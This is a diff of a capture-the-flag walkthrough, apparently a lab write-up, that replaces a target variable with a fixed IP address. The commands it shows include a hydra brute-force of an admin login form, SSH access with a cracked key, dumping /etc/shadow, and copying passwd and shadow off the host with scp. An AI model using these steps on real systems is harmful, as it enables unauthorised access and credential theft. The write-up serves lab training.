@@ -75,7 +75,7 @@ When we see that `gobuster` found a `/admin/` URL, we View Source of the page an
 
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
-    $TARGET http-post-form \
+    10.10.10.10 http-post-form \
     "/admin/:user=^USER^&pass=^PASS^:F=invalid" -I 2>&1 | tee $ROOM/hydra.log
 ```
 
@@ -128,7 +128,7 @@ Session completed.
 We can now use that to try to SSH in, and we get in, but immediately get kicked out!
 
 ```bash
-$ ssh admin@$TARGET -i ./id_rsa.txt                   
+$ ssh admin@10.10.10.10 -i ./id_rsa.txt                   
 
 Enter passphrase for key './id_rsa.txt': 
 Connection closed by 10.10.176.145 port 22
@@ -137,7 +137,7 @@ Connection closed by 10.10.176.145 port 22
 We try again with the username `john` from the main "Panel" page we found and we get in!
 
 ```bash
-$ ssh john@$TARGET -i ./id_rsa.txt
+$ ssh john@10.10.10.10 -i ./id_rsa.txt
 
 Enter passphrase for key './id_rsa.txt': 
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
@@ -207,8 +207,8 @@ sudo cat /etc/shadow > /tmp/shadow
 Then on your workstation, use SCP for example to go get those files from the target machine:
 
 ```bash
-scp -i ./id_rsa.txt john@$TARGET:/tmp/passwd ./
-scp -i ./id_rsa.txt john@$TARGET:/tmp/shadow ./
+scp -i ./id_rsa.txt john@10.10.10.10:/tmp/passwd ./
+scp -i ./id_rsa.txt john@10.10.10.10:/tmp/shadow ./
 ```
 
 You can now merge `passwd` and `shadow` and make them one file, like it used to be in the olden days of Unix, with `unshadow`:
